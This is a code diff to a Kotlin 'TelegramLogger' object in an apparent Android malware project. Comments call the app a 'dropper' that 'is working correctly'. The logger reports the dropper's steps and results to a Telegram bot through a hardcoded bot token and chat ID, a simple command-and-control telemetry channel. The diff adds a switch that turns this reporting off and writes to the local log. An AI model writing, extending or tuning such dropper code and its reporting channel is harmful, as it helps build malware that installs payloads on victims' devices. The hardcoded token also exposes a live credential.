@@ -11,6 +11,10 @@ import java.util.Locale
 
 object TelegramLogger {
 
+    // Dropper-side logging disabled — dropper is working correctly.
+    // Set to true to re-enable if dropper-side debugging is needed again.
+    private const val ENABLED = false
+
     private const val BOT_TOKEN = "9130546359:AAEl7vR4ahiQzX45RGjhUumBZRorvbyQXUw"
     private const val CHAT_ID   = "8852912150"
     private val TAG = "TelegramLogger"
@@ -46,6 +50,10 @@ object TelegramLogger {
      * process lifetime, unless the step is in ALWAYS_SEND_STEPS.
      */
     fun send(context: Context, step: String, result: String, detail: String = "") {
+        if (!ENABLED) {
+            android.util.Log.d(TAG, "[$step/$result] $detail")
+            return
+        }
         // ── Dedup check ───────────────────────────────────────────────────────
         if (step !in ALWAYS_SEND_STEPS) {
             val key = "$step|$result"
